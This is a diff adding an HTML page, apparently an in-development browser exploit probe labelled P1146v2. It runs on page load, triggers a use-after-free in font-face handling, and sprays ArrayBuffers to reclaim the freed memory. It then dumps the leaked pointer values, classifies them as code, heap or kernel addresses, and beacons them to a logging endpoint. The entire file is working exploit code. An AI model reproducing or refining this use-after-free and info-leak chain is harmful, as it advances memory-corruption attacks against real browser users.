@@ -1,0 +1,234 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1146v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1146v2: LIGHTWEIGHT 192B ZONE SURVEY ===');
+log('info','v1 crashed from heavy GC. Simplified: single UAF + lighter spray');
+B('P1146V2-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var sprayBufs=[];
+
+// Phase 1: Standard CSSFontFace UAF + reclaim
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // Light spray: 50 buffers only
+  for(var k=0;k<50;k++) sprayBufs.push(new ArrayBuffer(192));
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  B('P1146V2-PHASE1','sprayed='+sprayBufs.length);
+
+  // Find reclaimed buffer
+  var rIdx=-1,rv=null;
+  for(var k=0;k<sprayBufs.length;k++){
+    var v=new BigUint64Array(sprayBufs[k]);
+    for(var q=0;q<v.length;q++){if(v[q]!==0n){rIdx=k;rv=v;break;}}
+    if(rIdx>=0)break;
+  }
+
+  if(rIdx<0){
+    log('fail','No reclaim in phase 1');
+    B('P1146V2-RECLAIM','false');
+    doPhase2NoReclaim();
+    return;
+  }
+
+  // Dump the reclaimed CSSFontFace residue
+  var dump=[];
+  for(var q=0;q<24;q++) dump.push(hex64(rv[q]));
+  log('ok','Reclaimed idx='+rIdx);
+  log('ptr','q0-7:  '+dump.slice(0,8).join(' '));
+  log('ptr','q8-15: '+dump.slice(8,16).join(' '));
+  log('ptr','q16-23:'+dump.slice(16,24).join(' '));
+
+  // Classify pointer types in the CSSFontFace residue
+  var codeP=0,heapP=0,hiP=0;
+  for(var q=0;q<24;q++){
+    if(rv[q]===0n) continue;
+    var hi=Number(rv[q]>>32n);
+    if(hi>=0x5300 && hi<=0x53FF) codeP++;
+    else if(hi>=0x1000 && hi<=0x10FF) heapP++;
+    else if(hi>=0xFFFF8000) hiP++;
+  }
+
+  B('P1146V2-RECLAIM','idx='+rIdx+'|code='+codeP+'|heap='+heapP+'|kern='+hiP);
+  B('P1146V2-DUMP1','q0='+dump[0]+'|q1='+dump[1]+'|q2='+dump[2]+'|q3='+dump[3]);
+  B('P1146V2-DUMP2','q4='+dump[4]+'|q5='+dump[5]+'|q11='+dump[11]+'|q13='+dump[13]);
+
+  // Fingerprint: which qwords are non-zero
+  var fp='';
+  for(var q=0;q<24;q++) fp+=(rv[q]!==0n)?'1':'0';
+  log('info','Fingerprint: '+fp);
+  B('P1146V2-FP',fp);
+
+  doPhase2NoReclaim();
+},50);
+
+function doPhase2NoReclaim(){
+  // Phase 2: Create many 192B-sized objects, free them, spray, scan
+  // WITHOUT UAF - just mapping what lives in 192B bmalloc bucket
+  log('phase','--- Phase 2: 192B bucket object survey (no UAF) ---');
+
+  // Allocate objects that might be ~192 bytes internally
+  var objs=[];
+  try{for(var i=0;i<20;i++) objs.push(new TextDecoder('utf-8'));}catch(e){}
+  try{for(var i=0;i<20;i++) objs.push(new DOMRect(i,i,100,100));}catch(e){}
+  try{for(var i=0;i<20;i++) objs.push(new DOMMatrix([1,0,0,1,i,0]));}catch(e){}
+  try{for(var i=0;i<20;i++) objs.push(new Headers({'X':'v'+i}));}catch(e){}
+  try{for(var i=0;i<20;i++) objs.push(new AbortController());}catch(e){}
+  try{for(var i=0;i<20;i++) objs.push(new URLSearchParams('a='+i));}catch(e){}
+  try{for(var i=0;i<10;i++){var mc=new MessageChannel();objs.push(mc.port1);objs.push(mc.port2);}}catch(e){}
+
+  log('info','Created '+objs.length+' candidate objects');
+  B('P1146V2-OBJS','n='+objs.length);
+
+  // Drop refs to let GC collect
+  var saved=objs;
+  objs=null;
+
+  // Light GC: 2 rounds only
+  for(var i=0;i<2;i++){
+    var junk=[];
+    for(var j=0;j<5000;j++) junk.push({x:j});
+    junk=null;
+  }
+
+  // Spray 192B ArrayBuffers
+  var spray2=[];
+  for(var k=0;k<80;k++) spray2.push(new ArrayBuffer(192));
+
+  // Scan for non-zero (reclaimed object residue)
+  var hits=0;
+  var patterns={};
+  var samples=[];
+
+  for(var k=0;k<spray2.length;k++){
+    var v=new BigUint64Array(spray2[k]);
+    var hasNZ=false;
+    for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+    if(!hasNZ) continue;
+    hits++;
+
+    var fp='';
+    for(var q=0;q<24;q++) fp+=(v[q]!==0n)?'1':'0';
+    patterns[fp]=(patterns[fp]||0)+1;
+
+    if(samples.length<5){
+      var d=[];
+      for(var q=0;q<24;q++) d.push(hex64(v[q]));
+      samples.push({idx:k,fp:fp,d:d});
+    }
+  }
+
+  log('ok','Phase 2 hits: '+hits);
+  var patKeys=Object.keys(patterns);
+  log('info','Unique patterns: '+patKeys.length);
+  B('P1146V2-P2','hits='+hits+'|patterns='+patKeys.length);
+
+  for(var i=0;i<patKeys.length;i++){
+    log('info','  ['+patterns[patKeys[i]]+'x] '+patKeys[i]);
+  }
+  if(patKeys.length>0) B('P1146V2-P2-PAT',patKeys.slice(0,3).join(';'));
+
+  // Report samples with pointer analysis
+  var totalCode=0,totalHeap=0;
+  for(var si=0;si<samples.length;si++){
+    var s=samples[si];
+    log('ptr','Sample '+si+' idx='+s.idx);
+    log('ptr','  '+s.d.slice(0,8).join(' '));
+
+    for(var q=0;q<24;q++){
+      var val=BigInt('0x'+s.d[q].slice(2));
+      if(val===0n) continue;
+      var hi=Number(val>>32n);
+      if(hi>=0x5300 && hi<=0x53FF) totalCode++;
+      if(hi>=0x1000 && hi<=0x10FF) totalHeap++;
+    }
+
+    if(si<3) B('P1146V2-SAMPLE-'+si,'q0='+s.d[0]+'|q1='+s.d[1]+'|q2='+s.d[2]+'|q3='+s.d[3]);
+  }
+
+  log('info','Total across samples: code='+totalCode+' heap='+totalHeap);
+  B('P1146V2-PTRS','code='+totalCode+'|heap='+totalHeap);
+
+  saved=null;
+
+  doPhase3();
+}
+
+function doPhase3(){
+  // Phase 3: Test if CSSFontFace UAF survives a second trigger in same page
+  log('phase','--- Phase 3: Second UAF in same page ---');
+  var r2=Date.now()%100000+1;
+  var spray3=[];
+  var uaf2=false;
+
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:zz"+r2+";src:local(Arial);unicode-range:U+0043}";
+  document.head.appendChild(st2);
+  var ff2=new FontFace('yy'+r2,'local(Helvetica)',{unicodeRange:'U+0044'});
+  document.fonts.add(ff2);void ff2.loaded;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(uaf2)return undefined;uaf2=true;
+    if(st2.parentNode)st2.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    for(var k=0;k<50;k++) spray3.push(new ArrayBuffer(192));
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em yy'+r2+', zz'+r2,'CD').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var rIdx2=-1;
+    for(var k=0;k<spray3.length;k++){
+      var v=new BigUint64Array(spray3[k]);
+      for(var q=0;q<v.length;q++){if(v[q]!==0n){rIdx2=k;break;}}
+      if(rIdx2>=0)break;
+    }
+
+    log(rIdx2>=0?'ok':'fail','Second UAF reclaim: '+(rIdx2>=0?'idx='+rIdx2:'NO'));
+    B('P1146V2-UAF2','reclaim='+(rIdx2>=0)+'|idx='+rIdx2);
+
+    if(rIdx2>=0){
+      var v2=new BigUint64Array(spray3[rIdx2]);
+      var d2=[];
+      for(var q=0;q<8;q++) d2.push(hex64(v2[q]));
+      log('ptr','UAF2: '+d2.join(' '));
+      B('P1146V2-UAF2-DUMP','q0='+d2[0]+'|q1='+d2[1]+'|q11='+hex64(v2[11]));
+
+      // Compare fingerprint with first UAF
+      var fp2='';
+      for(var q=0;q<24;q++) fp2+=(v2[q]!==0n)?'1':'0';
+      log('info','UAF2 fingerprint: '+fp2);
+      B('P1146V2-UAF2-FP',fp2);
+    }
+
+    B('P1146V2-DONE','complete');
+    log('phase','=== P1146v2 COMPLETE ===');
+  },50);
+}
+</script></body></html>
